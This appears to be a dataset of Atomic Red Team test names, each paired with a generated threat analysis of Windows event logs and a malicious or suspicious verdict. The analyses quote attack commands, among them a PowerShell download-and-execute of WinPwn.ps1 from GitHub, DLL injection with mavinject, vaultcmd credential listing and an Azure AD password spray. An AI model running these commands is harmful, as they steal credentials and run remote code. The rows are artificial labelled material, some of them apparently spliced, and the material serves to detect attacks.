- Logging cleaning
- Privilege escalation
- Credential dumping script execution

All suggest a sophisticated attack possibly by an insider or through compromised credentials.

**Resolution**: MALICIOUS

**Recommendation**:
1. Immediately isolate the affected host `Server002` from the network to prevent further data exfiltration or lateral movement.
2. Conduct a comprehensive forensic investigation to determine the extent of the breach.
3. Review and change all potentially compromised credentials.

WinPwn - Loot local Credentials - Wifi Credentials,"Upon reviewing the provided logs, several potentially suspicious activities and clear indicators of malicious actions have been identified:

1. **Event Log Clearing:**
   - The `wevtutil.exe` utility was used multiple times to clear various logs, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. 
   - Instances include EventID 1102 from the Security log and EventID 104 from the System log. 
   - Clearing logs is a common tactic used by attackers to hide their activities.

2. **PowerShell Suspicious Activity:**
   - Multiple PowerShell events (EventID 600) in the Windows PowerShell logs indicate execution of a script from a suspicious URL from a GitHub repository (`S3cur3Th1sSh1t`). The command uses `iex(new-object net.webclient)` which is a known technique for fetching and executing code from the internet, specifically a script named `WinPwn.ps1`.
   - The script appears to be intended to extract WiFi credentials using `wificreds -consoleoutput -noninteractive`, which is malicious behavior aimed at credential theft.

3. **Unusual Time Changes:**
   - System time changes recorded in EventID 4616 of the Security log and supported by Kernel-General (EventID 1) from the System log. These might be attempts to manipulate timestamps to cover tracks or facilitate other attacks.

4. **Sysmon Observations:**
   - The Sysmon logs show the execution of `wevtutil.exe` in a manner that suggests log clearing activity by `admin_test`. The use of high integrity levels during these operations under a possibly admin context (User: SERVER002\\admin_test) signals a high possibility of unauthorized actions.

Assessment:

The combination of log clearing, suspicious PowerShell activity, and time manipulation provides multiple indicators of compromise. The logs clearly show that an individual with administrative-level access was executing suspicious commands aimed at covering malicious actions such as credential theft through PowerShell.

Resolution: **MALICIOUS**

3. **Long-term Measures:**
   - Strengthen security monitoring (especially logging and PowerShell execution policies) and apply least privilege principles.
   - Conduct regular security awareness training to prevent unauthorized practices."
Trigger an authenticated RPC call to a target server with no Sign flag set,"Upon analyzing the provided logs, several signs point to suspicious behavior which suggests that further investigation is needed:

1. **PowerShell Logs**:
   - The usage of ""rpcping"" in PowerShell's command is concerning. PowerShell commands and scripts executing with rpcping (Remote Procedure Call ping) indicate potential misuse for malicious purposes such as probing or interacting between servers, which could be related to an attacker attempting to establish a foothold or perform lateral movement.
   - The command `rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null` indicates local RPC ping with NTLM authentication, which is atypical in a normal user environment and can indicate reconnaissance or exploitation activity.

2. **System Logs**:
   - The event indicates that log files were cleared (`LogFileCleared`) by the user ""admin_test"" on multiple occasions including system, Windows PowerShell, and Security logs. Clearing logs is often a tactic associated with malicious actors to remove traces of their tracks or actions they have taken on the system.

3. **Sysmon Logs**:
   - Multiple usages of `wevtutil.exe` to clear logs as seen in command lines like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, indicate attempts to clear event logs. `wevtutil` is often misused to cover tracks after exploitation or data exfiltration.
   - Consistent use of `conhost.exe` paired with `wevtutil.exe` is observed. Although `conhost.exe` is typically benign, when observed in conjunction with other suspicious activities, it heightens concern.
   - Notably, the same user ""admin_test"" appears to use `whoami.exe`, which in isolation can be legitimate, but coupled with other activities can suggest a threat actor gathering system information.
   - Frequent execution of Microsoft Edge Update tasks without corresponding user-driven action indicates potential misuse or a scheduled task used as a persistence mechanism by an adversary.

4. **Security Logs**:
   - Logs indicate the Security log was cleared at the same time as other logs. This event suggests an attempt to obfuscate activity and evade detection.

### Assessment:
The combination of PowerShell commands involving rpcping, event log clearing by `wevtutil.exe`, and multiple signs of attempted obfuscation or cleanup in logs are indicative of potentially malicious activity. There is a strong indication of proactive steps being taken to hide traces, which is a typical behavior associated with a targeted attack or compromise.

### Resolution:
**SUSPICIOUS** - The activities observed in the logs notably the handling of event logs, PowerShell command with rpcping, and the processes used, warrant further investigation. The relationship and sequence of operations suggest it is more than just benign administration activity.

### Guidance:
- Conduct a thorough forensic examination on the affected system (""Server002""), especially focusing on the activities of the user ""admin_test.""
- Investigate historical logs and network traffic captures, if available, to identify indicators of lateral movement or data exfiltration.
- Verify access permissions and confirm user intent for actions particularly related to log manipulation and script executions.
- Review endpoint protection alerts for correlation with identified suspicious activities and engage in monitoring for further anomalies in the environment.
"
Request A Single Ticket via PowerShell,"After examining the provided Windows event logs, I have identified several indicators of potentially malicious activity that warrant further investigation. Here's a detailed analysis:

### Security Log:

- **Event ID 1102 (Log Cleared):** A security log entry indicates that the event logs were cleared by the user `admin_test`. This is unusual and often seen in malicious scenarios where an attacker tries to cover their tracks by deleting logs. 

### Sysmon Log:

- **Unexpected Process Executions:** Several instances of `wevtutil.exe` (Eventing Command Line Utility) are executed with commands to clear various logs.
  - `CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
  - This suggests that the log clearing activity was not just a mistake and appears orchestrated, indicating possible malicious intent.

- **PowerShell Execution:** The `powershell.exe` process execution with non-standard and obfuscated command line arguments:
  - `""powershell.exe"" & {Add-Type -AssemblyName System.IdentityModel, $ComputerFQDN...`
  - This could be a sign of script-based attacks or lateral movement techniques.

### Windows PowerShell Log:

- **Commands Executed via PowerShell:** The logs capture the execution of potentially harmful PowerShell scripts with obfuscation. The use of `Add-Type -AssemblyName` and manipulation of domain and token might be aligned with malicious activities such as token impersonation or network reconnaissance.

### System Log:

- **Event ID 104 (Log File Cleared):** The system logs indicate various log files being cleared, notably the System and Windows PowerShell logs, by `admin_test`. This further corroborates the malicious nature of activities as log clearing is a standard practice by attackers post-intrusion.

### Application Log and Other Activities:
  
- **Edge Update Installations/Updates:** While logs here mostly show updates involving Edge Browser (`MicrosoftEdgeUpdate.exe`), none exhibit immediate malicious behavior. However, they do coincide with the period when other suspicious activities were happening, making them worth checking for anomalies.
  
### Threats/Risks Identified:
- **Privilege Abuse:** The operations involving `admin_test` suggest that privileged access was used maliciously.
- **Persistence & Evasion:** Clearing logs and using PowerShell with obfuscation are tactics to maintain persistence and evade detection.

1. **Immediate Containment:** Isolate the server to prevent any further compromise or lateral movement.
2. **Forensic Analysis:** Preserve all evidence, including memory, disk images, and remaining logs for deeper analysis.
3. **Credential Audit:** Examine all credentials associated with `admin_test` for compromise.
4. **Investigate Network Activity:** Review network logs for unauthorized connections or data exfiltration attempts.

### Conclusion:
Given the above analysis, the activities span across log clearing actions, suspicious PowerShell executions, and use of event utilities, which strongly indicate malicious intent.

**Resolution:** MALICIOUS - The activities logged display clear signs of potential compromise and malicious intent. Immediate actions should be taken to mitigate and investigate further."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","### Detailed Analysis:

Upon reviewing the provided Windows event logs, several key elements point towards potentially malicious activity on the host Server002, primarily associated with the suspicious behavior of PowerShell and Event Log clearing activities.

#### Anomalies and Indicators of Malicious Activity:

1. **PowerShell Script Execution:**
   - The logs indicate the execution of a PowerShell script from a suspicious URL (https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1). This URL suggests downloading and executing a script directly from an online source, which is a known tactic for attackers to execute malicious payloads on a system. The PowerShell command seen in both Sysmon and PowerShell logs involves `iex(new-object net.webclient).downloadstring()`, which is commonly used in fileless malware attacks.

2. **Event Log Clearing:**
   - Multiple events across the Sysmon, System, and Security logs show logs being cleared (EventID 1102 in Security logs, EventID 104 in System logs). The clearing of event logs can be an indicator of malicious intent as it is typically done to hide unauthorized activities and prevent detection by security teams.

3. **Use of System Utilities:**
   - Frequent execution of system utilities like `wevtutil.exe` (used for event log management) with the `cl` (clear) command is indicative of attempts to manipulate or erase event logs, which further supports the potential malicious nature of these activities.

4. **High Integrity Level:**
   - Many of the suspicious actions, like the execution of the PowerShell script, are running at a High integrity level, suggesting the process has elevated privileges which could lead to significant system changes or damage.

5. **Continuous System Process Activity:**
   - Several processes, such as `conhost.exe`, have been spawned persistently throughout the logs in conjunction with critical system utilities or PowerShell, suggesting attempts to maintain persistence or execute commands through these hosts.

6. **Suspicious Time Synchronization Events:**
   - There are events indicating changes in system time (Kernel-General EventID 1), which may be utilized to confuse log timelines and further obfuscate malicious activity.

### Assessment:

Based on the analysis of these logs, there is strong evidence suggesting malicious activities. The combination of a suspicious PowerShell script being downloaded and executed, along with the clearing of event logs and the use of built-in Windows utilities to cloak activity, indicates potential compromise or malicious intent.

Hook PowerShell TLS Encrypt-Decrypt Messages,"Based on the analysis of the provided logs, several suspicious activities are identified that point towards potentially malicious actions. Below is a detailed breakdown:

### Suspicious Activities Identified:

1. **PowerShell Activity with DLL Injection**: 
   - The logs show PowerShell being executed with the command `mavinject $pid /INJECTRUNNING ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1056.004\bin\T1056.004x64.dll""`. DLL injection is a classic technique used by malicious actors to insert code into the address space of another process by forcing it to load a dynamic link library.
   - In addition to DLL injection, the presence of `Invoke-WebRequest https://www.example.com -UseBasicParsing` suggests potential outbound communication to an external resource, which may indicate data exfiltration or command-and-control (C2) communication.

2. **Event Log Clearing**:
   - The logs indicate that event logs have been cleared multiple times (`EventID: 104`). This is a common tactic used by attackers to cover their tracks after gaining unauthorized access.
   - Specifically, the security log (`EventID: 1102`) and Windows PowerShell log have been cleared, which raises further suspicion because attackers often clear logs to erase their activity footprint.

3. **Registry and Provider Alterations via PowerShell**: 
   - Events in the Windows PowerShell logs show various providers like `Registry`, `Alias`, and `Environment` being started via PowerShell commands associated with potentially malicious PowerShell activities.

4. **Privileged Account Usage**:
   - The user `SERVER002\admin_test` is performing most of these actions using a high integrity level, suggesting that the account being used has elevated privileges. Multiple privilege-related events (`EventID: 4672`) show this user having significant system privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and other high-impact privileges.

5. **Time Change Event**:
   - The system clock has been altered (`EventID: 4616` with `NewTime` and `OldTime` being inconsistent). Time change is often used by attackers to align the system time with their attack timelines, potentially impacting logs and alerting mechanisms.

### Conclusion:

Given the presence of DLL injection through PowerShell, the clearing of event logs, high-privilege account activities, and a time shift event, these logs present strong indicators of compromise.

### Assessment: MALICIOUS

This assessment concludes that the activities found in the logs are indicative of malicious activity. Immediate steps should be taken to isolate the affected host (Server002), conduct a full forensic investigation, and review user accounts and permissions, especially focusing on the `SERVER002\admin_test` account.

### Guidance for Next Steps:

1. **Isolate the Host**: Disconnect Server002 from the network to prevent further potential data breach or lateral movement within the network.
2. **Forensic Analysis**: Perform a deep forensic analysis of Server002 to determine the full scope of the compromise and identify potentially affected data.
3. **Review User Accounts**: Reset credentials and review permissions of high-privilege accounts such as `admin_test` to prevent unauthorized access.
4. **Monitor Network Traffic**: Analyze network logs to detect any unusual outbound communications that could indicate data exfiltration.
5. **Patch and Update Systems**: Ensure all systems are patched and up-to-date with the latest security updates to prevent exploitation through known vulnerabilities.

Azure - Search Azure AD User Attributes for Passwords,"### Analysis of Windows Event Logs

Upon a detailed examination of the provided Windows event logs, several indicators of potentially malicious activity are observed:

#### 1. **Clearing of Event Logs:**
- **Security Event Log:** EventID 1102 indicates that the security log was cleared. The operation was performed by the user `admin_test`.
- **System Event Log:** EventID 104 indicates that the system log was cleared and was performed by the same user `admin_test`.
- **Sysmon Event Log:** The sysmon operational log was also cleared with `wevtutil.exe` command-line operations visible in the Sysmon logs.

Clearing of event logs is a common tactic used by attackers to cover their tracks after compromise or during malicious operations.

#### 2. **Unusual PowerShell Activity:**
- The PowerShell log reveals a script execution that utilizes the `msonline` module to connect to Microsoft Online Services and attempts to extract user information with properties containing ""password"".
- The script uses `ConvertTo-SecureString` to handle passwords in plain text format and creates a `PSCredential` object, which is often used in administrative or credential-harvesting scripts.
- The output of the script is directed to a temporary file designated as `T1552.005Test1.txt`, which matches a known MITRE ATT&CK technique (T1552.005: Unsecured Credentials -> Cloud Credentials).

#### 3. **Use of `wevtutil.exe`:**
- Multiple instances of the `wevtutil.exe` were used with the `cl` (clear) command, indicating deliberate clearing of various logs, including Security, System, Application, and Windows PowerShell logs. The use of this utility is uncommon for regular administrative tasks when combined with a log-clearing operation.

#### 4. **High Privilege Usage:**
- All the processes executed with a high integrity level, indicating that the operation was conducted with administrative privileges. The user `SERVER002\\admin_test` conducted these operations.

#### 5. **Execution Link of Services:**
- There was a continuous sequence of process creation for PowerShell and other command-line utilities such as `hostname.exe` and `whoami.exe`, often used for system enumeration in post-exploitation scenarios.

### Assessment

The actions observed in these logs are highly suggestive of malicious activity. The clearing of logs, suspicious PowerShell activity, and the nature of the executed scripts strongly indicate an attempt to exfiltrate credentials and maintain persistence while avoiding detection. This aligns with malicious behavior patterns often seen with attackers covering their tracks after completion of compromise.

### Conclusion

Resolution: **MALICIOUS**

### Guidance

1. **Immediate Response:**
   - Disconnect the affected host from the network to prevent further unauthorized access or data exfiltration.
   - Conduct a thorough endpoint investigation and potentially engage incident response teams to analyze for persistence mechanisms and additional indicators of compromise.

2. **Remediation:**
   - Reset credentials, especially for the `admin_test` account and other potentially compromised accounts.
   - Examine other systems for similar activities or log-clearing events.

3. **Preventive Measures:**
   - Implement enhanced monitoring with alerting on uses of `wevtutil.exe` and suspicious PowerShell activities.
   - Review and tighten user access controls and audit policies for critical accounts.
   - Increase logging policies to cover such activities and use secure methods (e.g., forwarding logs to a centralized, tamper-evident system).

4. **Post-Incident Review:**
   - Analyze the incident to enhance security measures and policies.
   - Conduct regular security training for users and administrators to recognize and avoid phishing or credential harvesting attempts."
Run DSInternals Get-ADReplAccount,"**Detailed Analysis:**

**1. PowerShell Log:**
- The PowerShell logs exhibit the execution of a PowerShell command: `{Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(""\\"")}`. This command is querying Active Directory replication accounts. 
- While querying Active Directory with PowerShell can be legitimate, without proper context or permission, this action could potentially be suspicious. However, on its own, there is no clear indication of malicious activity.

**2. Security Log:**
- An Event ID 1102 from the Security log indicates that the security event log was cleared by the user `admin_test`. Clearing logs can be an indication of a cover-up attempt to hide malicious activities.

**3. Sysmon Log:**
- Multiple occurrences of `wevtutil.exe` being executed with the `cl` (clear) command are logged in the Sysmon logs. This operation was performed in succession to clear different event logs (Sysmon, Application, Security, and Windows PowerShell).
- The process responsible for these actions is under the user `SERVER002\admin_test`.
- Clearing event logs using `wevtutil.exe` is highly suspicious especially when done for multiple logs and without logging of corresponding legitimate reasons in the system.
  
**4. System Log:**
- Events specifically indicate the clearing of the System log by the same user, which aligns with the patterns found in Security and Sysmon logs.
  
**5. Application Log:**
- The Application log records are absent, possibly due to being cleared, consistent with the clearance activities noted in other logs.

**Assessment:**
- The combination of PowerShell executions querying sensitive Active Directory data and the explicit clearing of system, security, and PowerShell event logs using administrative level processes by a user is indicative of potentially malicious actions.
- The extensive use of `wevtutil.exe` to clear logs in a short timeframe is a common tactic for covering tracks in compromise scenarios.
  
**Threats and Risks Identified:**
- Potential compromise involving unauthorized access and misuse of administrative privileges.
- Possible data extraction or reconnaissance performed on the server followed by deliberate actions to delete evidence/logs.
  
**Guidance on How to Proceed:**
- Investigate the user account `admin_test` for unauthorized access or abuse.
- Review network and file access logs for any signs of data exfiltration or further unauthorized access.
- Ensure access controls are properly configured and consider restricting administrative access where possible.
- Conduct a security review and hardening of the system to prevent future occurrences.

**Final Resolution:**
- **MALICIOUS** - The combination of unauthorized PowerShell execution querying Active Directory and systematic log clearance without legitimate reasoning represents a clear sign of malicious activity."
Simulating access to Opera Login Data,"Upon analysis of the provided Windows event logs, there are several points of concern that indicate potentially malicious activity:

1. **Acquiring Sensitive Data Using PowerShell:**
   - The PowerShell logs show that a script was executed to copy sensitive data (`Opera Stable\\Login Data`) to a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads`), which is abnormal activity. This behavior suggests data exfiltration attempts which are typical actions of malware or unauthorized scripts.

2. **Event Log Clearing:**
   - The Security and System logs indicate that logs were cleared (Event ID 1102 in Security log and Event ID 104 in System log) by the user `admin_test`. Clearing event logs is a common tactic used by attackers to cover their tracks post-compromise.
   - The use of `wevtutil.exe` to clear logs is supported by the Sysmon logs, which detail the execution of commands to clear event logs across multiple channels (`System`, `Security`, `Application`, and `Windows PowerShell`).

3. **Suspicious Use of System Utilities:**
   - The presence of `whoami.exe` and `hostname.exe` executions might be consistent with typical reconnaissance actions, aiming to gather information about the system and the current user's context.
   - Frequent use of `wevtutil.exe` for clearing logs as indicated by Sysmon logs suggests a coordinated attempt to wipe traces of activity.

The combination of PowerShell being used to extract potential sensitive information and the subsequent tampering with system logs strongly suggests malicious intent and activity within the system, potentially indicating a compromise.

**Assessment: MALICIOUS**
- The activity documented involves data exfiltration and evidence tampering. These are hallmark signs of a security breach and could indicate a deeper compromise of the system.

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further exfiltration or lateral movement.
- Conduct a comprehensive forensic investigation to determine the extent of the breach, including any other compromised systems.
- Check for additional unauthorized accounts or elevated privileges on the system.
- Review and enhance logging and monitoring tools to prevent future log tampering.
- Reset credentials and consider a wider security audit of similar systems or networks as a precaution.
- Notify relevant stakeholders about the compromise and conclude with an incident report outlining response actions and findings."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"In analyzing the provided Windows event logs, there are several indicators that suggest potentially suspicious, if not outright malicious, activity that warrants further investigation. Here’s a detailed look at some key observations across different logs:

### Security Log:
1. **Event ID 1102 - Log File Cleared:**
   - The log indicates that the event log was cleared on the system by a user with the username `admin_test`. Clearing of logs can be a standard administrative task, but it can also indicate an attempt to cover tracks of illegal activities. This action is typically suspicious if done without clear justification.

2. **Event ID 5379 - Credential Validation:**
   - These events indicate failed credential validation attempts (`ReturnCode: 3221226021`) against various targets like `MicrosoftAccount:user=02txoixylodcstop`. Multiple attempts in quick succession suggest potential unauthorized access attempts or automated credential stuffing/brute-forcing activities.

### System Log:
- **Event ID 104 - Log File Cleared:**
  - Here again, we see evidence of log files being cleared in the Windows PowerShell and System channels by `admin_test`. As with the Security logs, frequent log clearing is often a red flag.

### PowerShell Log:
- The logs record execution of a PowerShell command interacting with `appcmd.exe` to list IIS application pools. While legitimate in certain contexts, it warrants a deeper audit of the intent and origin since PowerShell is a common vector for malicious scripts, especially when combined with elevated privileges.

### Sysmon Log:
1. **Process Executions with High Integrity Level:**
   - The logs show the execution of several command-line utilities like `wevtutil.exe` (used to clear event logs as noted) and PowerShell commands executed with High Integrity (suggesting admin-level operations). The use of `wevtutil` to clear event logs strengthens the suspicion of malicious activity.

2. **Parent-Child Process Relationships:**
   - The parent processes for some of these tools (`parent of wevtutil.exe` and `powershell.exe`) is `wsmprovhost.exe`, which suggests potential remote commands being issued, possibly via Windows Remote Management.

### Overall Assessment
The clearing of event logs in several channels, coupled with failed credential attempts, and suspicious command executions using PowerShell point towards plausible malicious behavior. The logs suggest an attempt to conceal unauthorized activities, which could potentially be an indicator of compromise.

### Recommendation
Resolution: **MALICIOUS**

1. **Immediate Action:** Initiate a thorough forensic investigation focusing on:
   - The user account `admin_test` and any administrator-level actions around the time the logs were cleared.
   - Network logs and authentication logs to trace the source of suspicious activities.
   - Full examination of running processes and open network connections to identify any active threats.

2. **Mitigation:** If possible, isolate `Server002` to prevent further potential data exfiltration or lateral movement within the network.

3. **Security Audit:** Implement and verify security measures, including reviewing user access privileges, increasing logging levels for sensitive operations, and deploying threat detection mechanisms to catch similar activities proactively.

Due to the nature of events seen, this situation poses a significant risk to security and should be handled with urgency and thoroughness."
GPP Passwords (Get-GPPPassword),"Upon analysis of the provided Windows event logs, the following observations can be made:

### Potentially Suspicious Activities:
1. **Event Clearing:**
   - System logs, Application logs, and Security logs have been cleared shortly before the time of potential suspicious activity. The `LogFileCleared` entries on `2024-10-27 20:34:07.913` (System), `20:34:08.015` (Security), and `20:34:08.118` (PowerShell) indicate that the `admin_test` user executed commands to clear event logs. Clearing event logs is generally a tactic used by threat actors to hide traces of their activities.

2. **PowerShell Execution:**
   - A PowerShell script `Get-GPPPassword.ps1` was executed from an unusual directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\`. The script's purpose appears to be getting Group Policy Preferences (GPP) passwords, which can be a clear indication of privilege escalation effort or recon activity by malicious entities.

3. **Use of Tools:**
   - Execution of `wevtutil.exe` with the command `cl Microsoft-Windows-Sysmon/Operational` suggests logs were being cleared using command-line utilities. This activity was initiated under `SERVER002\\admin_test` with high integrity level, indicating elevated permissions.

4. **Unusual Process Trees:**
   - The processes were spawned by `C:\\Windows\\System32\\wsmprovhost.exe` with command-line `-Embedding`, indicating usage typically associated with Windows Remote Management (WinRM), possibly used for remote execution and fetching data.

### Assessment:
Based on the above findings, there is evidence to suggest malicious behavior:
- The execution of a script aimed at obtaining GPP passwords is particularly concerning.
- Clearing of event logs systematically is a red flag.
- Overall, the chain of events suggests an attempt to conceal activities that could be linked to a breach or compromise.

### Resolution:
- **MALICIOUS**: The activities observed in the logs – particularly the log-clearing actions, execution of a sensitive PowerShell script, and the associated use of privileged processes – are indicative of malicious behavior.

### Actionable Guidance:
1. **Immediate Incident Response:**
   - Isolate `Server002` from the network to prevent potential lateral movement or exfiltration.
   - Preserve all logs and current memory state for forensic analysis.
   - Begin a full forensic investigation to understand the scope and impact of the activity.

2. **Review and Strengthen Security Policies:**
   - Disable the use of PowerShell scripting for non-administrative users.
   - Implement stricter logging and monitoring for PowerShell and other administrative tools.
   - Incorporate real-time alerts for critical actions like event log clearing.

3. **User Credential Review:**
   - Investigate and potentially disable the `admin_test` account.
   - Force password changes for all privileged accounts.
   
These steps are crucial for mitigating the current threat and for preventing similar incidents in the future."
Export Root Certificate with Export-PFXCertificate,"Upon a thorough analysis of the provided event logs, several activities and patterns stand out which suggest suspicious or potentially malicious behavior:

### Suspicious Activities:

1. **Event Log Clearing:**
   - Multiple entries in the `System` and `Security` logs indicate the clearing of the logs by the user `admin_test`. Clearing of logs can be an attempt to cover tracks after unauthorized or malicious activity. 
   - Logs were cleared across several channels including System, Windows PowerShell, and Security.

2. **Windows PowerShell Activities:**
   - The execution of a PowerShell script that generates a self-signed certificate and exports it is suspicious. The script involves operations on the certificate store and exporting a PFX file with a password, which is a common practice in malicious scenarios such as persistence or lateral movement.
   - The use of `ConvertTo-SecureString` with plain text followed by exporting a certificate indicates a potential attempt to manipulate security certificates.

3. **Sysmon Events:**
   - The process `wevtutil.exe`, which is responsible for event log operations, has been used multiple times in association with log clearing events. This utility is not generally used in routine operations, particularly not by a regular user.
   - Processes like `conhost.exe`, `whoami.exe`, and `hostname.exe` are observed executing under the user `admin_test` shortly after the logs were cleared. These utility programs align with reconnaissance activities often seen in early stages of attack campaigns.

4. **Use of `AtomicRedTeam`:**
   - `AtomicRedTeam` is an open-source library of information security tests mapped to MITRE ATT&CK™ Techniques, indicating potential use of security testing or simulation tools. While it could be used legitimately for testing, its presence should be verified to ensure it is sanctioned and not abused for malicious intent.

### Assessment:
The combination of cleared logs, suspicious PowerShell command executions, and system utility processes executed consecutively suggest that this is not normal administrative activity. While no explicit malware or exploit is directly identified in the logs, the sequence and nature of activities warrant a deeper investigation.

### Resolution:
**SUSPICIOUS**

### Guidance:
1. **Immediate Review**: Engage the IT/security team to review user `admin_test` activities, focusing on system access logs, changes to user privileges, and any network-based indicators.
   
2. **Audit and Monitoring**: Ensure heightened monitoring of logs and sessions, especially for PowerShell activity and event log modifications.

3. **User Validation**: Confirm with organizational policy whether the use of `AtomicRedTeam` tools was planned or sanctioned for testing purposes.

4. **Forensic Analysis**: Consider conducting a deeper forensic analysis of the system, identifying any traces of potential lateral movement or persistence mechanisms.

5. **Incident Response**: Prepare for incident response actions, as these activities could be indicative of an initial compromise or test run before a larger attack."
Dump Kerberos Tickets from LSA using dumper.ps1,"Based on the analysis of the provided logs, there is a pattern of suspicious activities indicative of potential malicious behavior:

1. **Event Log Clearing (Event IDs 1102 and 104):**
   - Multiple log entries highlight that the security, system, and Windows PowerShell logs were cleared. This is done using the `wevtutil` tool by the user ""admin_test"".
   - The clearing of security logs without any legitimate reason is often associated with efforts to cover tracks following unauthorized or malicious activities.

2. **Time Manipulation (Event ID 4616):**
   - There are entries indicating the system time was changed. Time change events, especially when performed in conjunction with log clearing, may indicate attempts to obscure the timeline of potentially malicious activities.

3. **Privilege Use (Event ID 4672):**
   - An account ""admin_test"" obtained privileges including `SeDebugPrivilege`, a high-level privilege that allows processes to inspect and modify the memory of other processes. This is a powerful privilege often used in attacks for debugging or further privilege escalation.

4. **Suspicious PowerShell Activity:**
   - The PowerShell logs and the Sysmon logs show unusual command line execution, particularly with a script downloaded from a GitHub repository (`dumper.ps1`). This behavior strongly suggests the execution of potentially malicious or unauthorized scripts.
   - The use of `Invoke-Expression` with content from the internet is a classic indicator of ""living off the land"" attacks where legitimate tools are misused.

5. **Network-based PowerShell Execution:**
   - The suspicious PowerShell command suggests that the script might be used for lateral movement or credential dumping, both common tactics during malicious intrusions.

6. **Credential Access Failures (Event ID 5379):**
   - There are entries showing credential access attempts that were not successful. These may correlate with unauthorized attempts to access sensitive resources.

7. **Frequent Network Logons (Event ID 4624):**
   - Multiple logon events over a short period, associated with “logon type 3” (network), could signify credential usage in suspicious contexts, especially using NTLM authentication from an external system.

**Assessment and Conclusion:**
The analyzed logs contain multiple indicators of potentially malicious activity, including cleared event logs, time manipulation, PowerShell script execution from a remote site, and unusual privilege use. These activities align with common attack vectors involved in exploiting systems and maintaining persistence.

**Resolution**: MALICIOUS

### Recommendations:
- **Immediate Containment**: Isolate the machine ""Server002"" from the network to prevent further spread or exfiltration of data.
- **Credentials Audit**: Reset credentials for the ""admin_test"" account and any other potentially compromised accounts.
- **Detailed Forensic Analysis**: Perform a comprehensive forensic analysis to understand the scope and impact of the intrusion.
- **Patch and Hardening**: Ensure the system is updated and hardened against similar exploits.
- **Educate and Monitor**: Educate staff about phishing and social engineering attacks, and enhance monitoring for early detection of similar activities."
Password spray all Azure AD users with a single password,"Upon reviewing the given Windows event logs, there is a significant sequence of events that suggest suspicious and malicious activity, specifically relating to potential password spraying:

1. **PowerShell Command Execution:**
   - A suspicious PowerShell command is executed by the user `SERVER002\admin_test` which includes attempts to connect to AzureAD with hardcoded credentials and attempts to brute-force user accounts using a common password (`P@ssw0rd!`). The full PowerShell script indicates an attempt at password spraying, which is a known method to compromise accounts.

2. **Clearing of Event Logs:**
   - Security Event ID 1102 indicates that the Windows security log was cleared. This corresponds with logs cleared in both Security and System channels by the same user, `admin_test`. Clearing event logs is a common tactic used by attackers to cover tracks.

3. **Process Execution and Parent-Child Relationships:**
   - The PowerShell activity is linked to a process chain that starts with `wsmprovhost.exe`, which is fired in the context of a high-integrity level and executed scripts typically associated with remote management tasks. Conhosts are used extensively, which is normal for console applications, but in this context, it aligns with the PowerShell script execution.

Due to these observations, there are clear signs of suspicious and likely malicious activity:

1. **Anomalous PowerShell execution** with suspected password spraying attempts.
2. **Event log clearing** activities suggest deliberate action to hide malicious behavior.
3. All activities are executed under a suspicious administrative account `admin_test`.

### Assessment:

- **Threat Level:** High
- **Risk:** Unauthorized access to accounts, data breach, compromised credentials, possible lateral movement within the infrastructure.

### Guidance:

1. **Immediate Response Required:**
   - Isolate the host `Server002` to prevent further potential data exfiltration or lateral movement by the attacker.
   - Conduct a full forensic analysis of the host to identify any other indicators of compromise.
   
2. **Review All Administrative Accounts:**
   - Check for any signs of unauthorized access or unusual behavior related to administrative accounts. Reset all potentially compromised accounts immediately and enforce multi-factor authentication.

3. **Improvement and Mitigation:**
   - Implement stringent logging and monitoring mechanisms to detect similar activities in the future.
   - Conduct a review of AzureAD permissions and access logs to ensure no other accounts were compromised.

**Resolution:** MALICIOUS - Logs contain clear malicious activities indicative of a compromised host and attempted unauthorized AzureAD access through password spraying."
Access Saved Credentials via VaultCmd,"Upon reviewing the provided log entries, several indicators of potentially malicious activity emerge. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Event Log Clearing:**
   - The use of `wevtutil.exe` to clear logs is a common tactic used by attackers to cover their tracks. The logs show multiple instances where `wevtutil.exe` was used by the user `admin_test` to clear security, System, and Windows PowerShell logs (Event IDs 1102, 104).

2. **Privilege Escalation:**
   - The event log reflects a user `admin_test` obtaining privileges such as `SeDebugPrivilege` and `SeSecurityPrivilege` (Event ID 4672). Given the subsequent use of these privileges to manipulate the event logs, this could be indicative of nefarious intent.

3. **Time Rollback:**
   - There are entries suggesting a rollback on system time (Event ID 4616), which is a technique used to potentially manipulate timestamps in logs or bypass time-sensitive security mechanisms.

4. **Use of VaultCmd.exe:**
   - The execution of `vaultcmd.exe` with the option to list Windows credentials (seen in the Sysmon logs with a command line indicating credential access) could indicate an attempt to access stored credentials.

### Events of Interest:
- **Event ID 1102:** Indicates event log clearance, potentially an attempt to erase traces of activity.
- **Event ID 4672 & Event ID 4624:** Show an admin obtaining special privileges and logging in, potentially part of a privilege escalation tactic.
- **File Hash Consistency:** There is some consistency in file hashes across legitimate processes which needs deeper analysis in context with other activities.
- **Command Execution:** The use of `cmd.exe` to run `vaultcmd /listcreds` is suspicious in a server context where dumping credentials would not be a routine operation.

### Assessment:
Based on the combination of changed system time, multiple log clearances, and privilege escalation, these logs collectively describe a pattern that aligns with malicious behavior. While the execution of standard Windows processes alone isn't inherently suspicious, their use in this scenario points towards an attempt to cover illicit activities and extract sensitive information.

### Resolution:
- **Resolution: MALICIOUS** - Given the consistent effort to delete logs, alter system time, escalate privileges, and access credentials, it is confident that these events are indicative of a compromise or ongoing unauthorized activities.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent further data exfiltration or malicious activity.
2. **Credential Security:**
   - Initiate a company-wide password reset, especially focusing on privileged accounts.
